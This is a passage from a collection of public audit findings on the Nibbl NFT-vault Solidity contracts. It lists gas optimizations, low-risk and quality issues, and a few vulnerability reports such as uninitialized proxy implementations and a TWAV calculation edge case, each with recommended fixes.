[NibblVaultFactory.sol#L149](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149) [NibblVaultFactory.sol#L166](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166)   ### [G07] Packing Variables  Moving the uint32 variable primaryReserveRatio down to line 52  will it allow it to be stored with secondaryReserveRatio and use 1 less storage slot (save 20,000 gas). [NibblVault.sol#L28](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L28)   ### [G08] Calldata Over Memory  When using function arguments that you only need to reference and not make any modifications to it is cheaper to use calldata than memory.  Instances where calldata can be used instead of memory: [NibblVaultFactory.sol#L41-L42](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L41-L42) [NibblVaultFactory.sol#L80](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L80) [NibblVaultFactory.sol#L88](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L88) [NibblVault.sol#L174-L175](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L174-L175) [NibblVault.sol#L504](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L504) [NibblVault.sol#L523](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L523) [NibblVault.sol#L545](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L545) [Basket.sol#L41](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41) [Basket.sol#L68](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L68) [Basket.sol#L91](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L91) [EIP712Base.sol#L15](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L15)  ### [G09] Minimize SLOAD's Whenever referencing a storage variable more than once in a function without modifying it, it is cheaper to cache locally and use that instead.  (normally 100 gas each use vs 103 gas to SLOAD/MSTORE for the first use and then only 3 gas for any others)  [NibblVaultFactory.sol#L107](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107) can cache basketUpdateTime (save ~97 gas) [NibblVaultFactory.sol#L131](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131) can cache feeToUpdateTime (save ~97 gas) [NibblVaultFactory.sol#L149](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149) can cache feeAdminUpdateTime (save ~97 gas) [NibblVaultFactory.sol#L166](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166) can cache vaultUpdateTime (save ~97 gas) For the previous 4 make sure to only use cached variables when referencing not when deleting. [NibblVault.sol#L139](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L139) can cache buyoutEndTime (save ~97 gas) [Twav.sol#L27-L29](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L27-L29) can cache twavObservationsIndex (save ~194 gas) On line 29 ensure the cached value is only used on the right side of the assignment.   ### [G10] Using smaller than 32 byte uints (uint256) can cost more As explained in [Solidity Docs](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) using elements smaller than 32 bytes can cost more gas. Recommend replacing the follpwing with uint256: [Twav.sol#L22](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L22) [Twav.sol#L37](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L37) "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Low Risk Vulnerabilities ## 1. `getBasketAddress` could return inaccurate value if `basketImplementation` changes It is possible that the `basketImplementation` gets upgraded to a new address. If an integrator relies on `getBasketAddress` to deterministically determine the  address of a basket that has been deployed using the old implementation, it will return the incorrect address.  ### Recommended Mitigation Steps Consider adding an extra parameter `_implementation` or overload the function with the extra parameter: ``` function getBasketAddress(address _curator, string memory _mix, address _basketImplementation) public override view returns(address _basket) {     bytes32 newsalt = keccak256(abi.encodePacked(_curator, _mix));     bytes memory code = abi.encodePacked(type(ProxyBasket).creationCode, uint256(uint160(_basketImplementation)));     bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code)));     _basket = address(uint160(uint256(hash)));      } ```  ### Related Codes https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L88-L93  ## 2. Missing sanity check on `_minBuyoutTime` When creating a vault, a faulty deployment payload could set `minBuyoutTime` to a very high value, virtually disabling the buyout function.  ### Recommended Mitigation Steps Consider adding a sanity check to make sure it's set within a reasonable value: ``` require(_minBuyoutTime <= 52 weeks, \"NibblVault: minBuyoutTime must not be longer than one year\"); ``` ### Related Codes https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L202  ## 3. Check `_feeAdmin` instead of `_adminFeeAmt` When charging fee in `_chargeFee` and `_chargeFeeSecondaryCurve`, there's a check to ensure `_adminFeeAmt` is larger than zero before transferring the funds to `feeAdmin`.  It is possible for `_adminFeeAmt` to be higher than zero yet `_feeAdmin` returns zero because of rounding. Therefore, it will be more accurate to use `_feeAdmin` instead. ### PoC ``` uint256 _feeAdmin = (_amount * _adminFeeAmt) / SCALE ; ``` When `_amount  * _adminFeeAmt` is lower than `SCALE`, `_feeAdmin` will have the value of `0`. ### Recommended Mitigation Steps Check that `_feeAdmin` is larger than `0` instead: ``` if(_feeAdmin > 0) {     safeTransferETH(_factory, _feeAdmin); //Transfers admin fee to the factory contract } ``` ### Related Codes https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L227 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L243  # Non-Critical Vulnerabilities ## 1. Uncustomizable Basket details When creating a basket, the basket name and symbol is fixed to \"NFT Basket\" and \"NFTB\" respectively. It would be hard for users to distinguish one basket from another when seen through etherscan or wallets.   ### Recommended Mitigation Steps Consider adding an extra parameter so basket creator can append a unique identifier for the baskets. For instance, when making a basket containing CryptoPunks, the name and symbol would be: ``` NFT Basket - Punks NFTB-PUNKS ``` ### Related Codes https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L82 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L13  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "1. Use != 0 instead of > 0 for uint variables - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L227 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L243   2. No need to initialize variables with default values - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L70 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L93 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547  3. Use ++i instead of i++, i+=1, also unchecked increments in for-loops will save gas cost - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L70 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L93 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547  4. An array\u2019s length should be cached to save gas in for-loops - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L43 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L70 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L93 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L506 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L525 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L547  5. Non-strict inequalities are cheaper than strict ones - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L224  6. Usage of unchecked can reduce the gas cost - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L319 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L378  7. require()/revert() strings longer than 32 bytes cost extra gas - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L48 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L49 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L105 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L141 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L166  8. Check zero amount before transfer - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L458 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L468 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L478  9. Check \"_feeAdmin != 0\" instead of \"_adminFeeAmt > 0\". The real transfer amount is _feeAdmin and this value might be zero even though _adminFeeAmt > 0 according to [fee calculation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L216)  - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L227 - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L243   10. Needless calculation From the calculation, we can see \"(_index + 1) % TWAV_BLOCK_NUMBERS\" is same as \"twavObservationsIndex\" because \"_index\" is the previous index of \"twavObservationsIndex\".  - https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L39"}, {"title": "Twav._getTwav() will return a wrong result when twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp = 0.", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L36   # Vulnerability details  ## Impact The \"if\" condition of Twav._getTwav() is missing some edge cases. In this case, this function will return 0 which is different from the correct value and it will affect the main functions like NibblVault.buy() and NibblVault.sell().  ## Proof of Concept I think this condition is to confirm at least 4 values were saved for twav calculation. Btw this timestamp would be zero even though there are more than 4 values properly as it's modularized by 2**32. In this case, the if condition will be false and this function will return 0.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps I see \"cumulativeValuation\" is increasing all the time and recommend replacing \"timestamp\" with \"cumulativeValuation\". ``` if (twavObservations[TWAV_BLOCK_NUMBERS - 1].cumulativeValuation != 0) { ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/100", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# [L-01] `ecrecover` does not check for zero address  The solidity `ecrecover` function is called directly to verify the given signatures. However, the `ecrecover` EVM opcode allows malleable (non-unique) signatures and thus is susceptible to replay attacks. A replay attack may not be possible here, but ensuring the signatures are not malleable is considered a best practice.  https://github.com/code-423n4/2022-06-nibbl/tree/main/contracts/NibblVault.sol#L563  ## Recommended Mitigation Steps  Use the `recover` function from [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) for signature verification. This is what OpenZeppelin does in their [ERC20 permit implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/83277ff916ac4f58fec072b8f28a252c1245c2f1/contracts/token/ERC20/extensions/draft-ERC20Permit.sol#L64)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# `Twav.sol`  ## `timestamp` in `TwavObservation` is declared as `uint32` but cannot be packed with other variables  Usually, it makes sense to try to follow a Tight Variable Packing approach to not waste gas, but in this case, it's useless and will only cost more gas.  The `timestamp` variable inside the struct will anyway take a whole slot because after it's declaration we have `cumulativeValuation` that is a `uint256`.  Declaring `timestamp` as a `uint256` will allow `NibblVault` to waste less gas because there is no more need to perform all the math + cast operations done on the timestamp (example: `uint32 _blockTimestamp = uint32(block.timestamp % 2**32);`).  Consider change the type of `timestamp` to a `uint256` "}, {"title": "Avoid leaving a contract uninitialized", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/91", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L173 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L23 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L99   # Vulnerability details  ## Impact In OpenZeppelin Contracts (proxy/utils/Initializable.sol): > CAUTION: An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation...   ## Proof of Concept This can lead to takeover of 2 contracts: `Basket.sol` and `NibblVault.sol` since implementation contracts not initialized and can be initialized publicly. https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol   Also, Upgrading either of their implementation in `NibblVaultFactory.sol` when  `proposeNewVaultImplementation(address _newVaultImplementation)` or `proposeNewBasketImplementation(address _newBasketImplementation)` can lead to the same issue if the upgraded contract did not disable initializers. https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L99    ## Recommended Mitigation Steps As its mentioned in OpenZeppelin Contracts documentation:  >To prevent the implementation contract from being used, you should invoke the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:   ``` /// @custom:oz-upgrades-unsafe-allow constructor     constructor() {         _disableInitializers();     } ```  Should both of `Basket.sol` and `NibbleVault.sol` use the `_disableInitializers();` which make the implementation contract unable to be initialized to version 1. Hence, for newer version of `Basket.sol` and `NibbleVault.sol` proposed for the factory should also be initialized to version 1 to prevent the attack https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L165 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L130  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/87", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": " DEFAULT_ADMIN_ROLE is already default admin role for all roles https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Utilities/AccessControlMechanism.sol#L22-25 Those lines are obsolete  --------------------------------------------------------------- Unused receive() function will lock Ether in contract  If the intention is for the Ether to be used, the function should call another function, otherwise it should revert https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L183 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L585 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L114 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Proxy/ProxyBasket.sol#L56 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Proxy/ProxyVault.sol#L56  -----------------------------------------------------------  Missing checks for address(0x0) when assigning values to address state variables  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L193 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L191 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L487 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L124 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L132 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L159 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L167  -----------------------------------------------------------  public functions not called by the contract should be declared external instead  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L69 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L76 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L80 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L88 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Twav/Twav.sol#L44  --------------------------------------------------------------------------- Use a more recent version of solidity  Use a solidity version of at least 0.8.12 to get string.concat() to be used instead of abi.encodePacked(,) ----------------------------------------------------------- "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/74", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "1. Unbounded loops The following contains a for loop that can be unbounded. This would mean it could run out of gas and the function would revert   **Occurrences in: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L43 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L70 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L93 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L43 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L70 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L93 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L506 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L525 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L547     2. Missing input validation on array lengths The functions below fail to perform input validation on arrays to verify the lengths match. A mismatch could lead to an exception or undefined behavior.  **Occurences in: NibblVault.withdrawMultipleERC721() -  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L504 NibblVault.withdrawMultipleERC1155() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L545 NibblVault.onERC1155BatchReceived() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L545 Basket.withdrawMultipleERC721() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L41 Basket.withdrawMultipleERC1155() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L68 Basket.onERC1155BatchReceived() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L109   3. Missing validation check for non-zero totalSupply() NibblVault.redeem() doesn't check for a non-zero totalSupply to prevent a divide-by-zero issue in https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L466   4. Use of unchecked transfer() The following are functions make use of unsafe transfer() which does not check the return value.  **Occurrences in: Basket.withdrawERC20() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L87 Basket.withdrawMultipleERC20() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L94 NibblVault.withdrawERC20() - https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L517 NibblVault.withdrawMultipleERC20() -  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L526 Basket.withdrawETH() -  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L80   5. Missing zero address check during transfers The following functions are missing a zero address check to prevent transfer of ETH or ERC to zero address  **Occurrences in: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L454-L459 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L464-L469 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L474-L479 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L504-L509 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L495-L498 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L362-L389 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L300-L326 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L515-L518 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L523-L528 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L535-L539 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L545-L550 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L35-L37 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L41-L44 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L52-L54 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L61-L64 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L68-L72    6. Missing zero address check can make curator lose fee The `updateCurator()` function in https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L485-L488 is missing a require check to ensure the `_to` parameter is not a zero address. Current function could have the curator address changed to 0 address by mistake and with that the accrued curator fees will not be redeemable.   7. Missing zero address check on new Basket Implementation proposeNewBasketImplementation() sets the address for a proposed new Basket Implementation, however fails to check `_newBasketImplementation` is not a zero address. This can allow IMPLEMENTER_ROLE to mistakenly set the proposed new Basket Implementation to address zero and call updateBasketImplementation() to effect the change.  **Occurrence in: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L99-L100    8.\u00a0 Missing zero address check on new Admin Fee address proposeNewAdminFeeAddress() sets the address for a proposed\u00a0 new Admin Fee address, however fails to check `_newFeeAddress` is not a zero address. TThis can allow IMPLEMENTER_ROLE to mistakenly set the proposed\u00a0 new Admin Fee address to address zero and the call updateNewAdminFeeAddress() to effect the change.  **Occurrence in: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L123    9. Missing zero address check on new Vault plementationproposeNewVaultImplementation() sets the address for a proposed new Vault Implementation, however fails to check `_newVaultImplementation` is not a zero address. This can allow IMPLEMENTER_ROLE to mistakenly set the proposed new Vault Implementation to address zero and call updateVaultImplementation() to effect the change.  **Occurrence in: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L158     10. Missing zero address check and zero value check in constructor https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L23   11. Contract can lock ETH. Some contracts' receive() function allows anyone to send ETH to the contract since it's missing a require check https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L183 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Proxy/ProxyVault.sol#L56 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Proxy/ProxyBasket.sol#L56 "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "1. Title: Using multiple `require` instead `&&` can save gas  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L107 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L131  Recommended Mitigation Steps: ```  require(basketUpdateTime != 0, \"NibblVaultFactory: UPDATE_TIME has not passed\");  require(block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ``` ________________________________________________________________________  2. Title: Comparison operators  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L107 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L131 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L141 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L149  Recommended Mitigation Steps: Replace `<=` with `<`, and `>=` with `>` for gas optimization ________________________________________________________________________  3. Title: Reduce the size of error messages (Long revert Strings)  Impact:  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Proof of Concept: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L48 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L107 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L131  Recommended Mitigation Steps: Consider shortening the revert strings to fit in 32 bytes ________________________________________________________________________  4. Title: Custom errors from Solidity 0.8.4 are cheaper than revert strings  Impact: Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information  Custom errors are defined using the error statement reference: https://blog.soliditylang.org/2021/04/21/custom-errors/  Proof of Concept: 